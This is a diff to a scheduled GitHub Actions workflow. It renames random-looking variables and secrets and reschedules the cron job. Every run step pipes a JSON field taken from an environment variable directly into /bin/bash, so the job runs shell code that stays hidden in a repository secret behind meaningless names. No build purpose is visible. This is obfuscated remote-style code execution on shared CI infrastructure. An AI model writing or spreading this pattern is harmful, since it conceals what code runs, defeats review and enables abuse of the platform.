@@ -1,8 +1,10 @@
 name: lilangzx
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 0/6 * * *'
+    - cron: '43 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,15 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: lilangzx
         env:
-          titb47540: ${{ secrets.titb47540 }}
+          sb0784: ${{ secrets.sb0784 }}
         run: |
-          echo $titb47540 | jq -r .szdp464 | /bin/bash
-          echo $vg55 | jq -r .dyz8239 | /bin/bash
-          echo $lat867 | jq -r .vho964 | /bin/bash
-          echo $cvob4 | jq -r .hs7078 | /bin/bash
-          echo $nolbt7 | jq -r .igm45 | /bin/bash
-          echo $a186 | jq -r .gtbs5 | /bin/bash
-          echo $nfask163 | jq -r .v098 | /bin/bash
-          echo $df95065 | jq -r .gy28 | /bin/bash
-          echo $yajlf0 | jq -r .ok36 | /bin/bash
+          echo $sb0784 | jq -r .ezk7468 | /bin/bash
+          echo $m0 | jq -r .k836 | /bin/bash
+          echo $i3 | jq -r .y75962 | /bin/bash
+          echo $vm501 | jq -r .gvugz89104 | /bin/bash
+          echo $ksv585 | jq -r .d52180 | /bin/bash
+          echo $sd98 | jq -r .b6848 | /bin/bash
+          echo $hb47125 | jq -r .ry1 | /bin/bash
+          echo $ruc30 | jq -r .w00 | /bin/bash
+          echo $rwy8234 | jq -r .ht206 | /bin/bash
+          echo $dga449 | jq -r .qtgpi8 | /bin/bash
+          echo $yah6718 | jq -r .empuw5565 | /bin/bash
+          echo $ho2154 | jq -r .wnqwn8 | /bin/bash
+          echo $si67932 | jq -r .s687 | /bin/bash
 
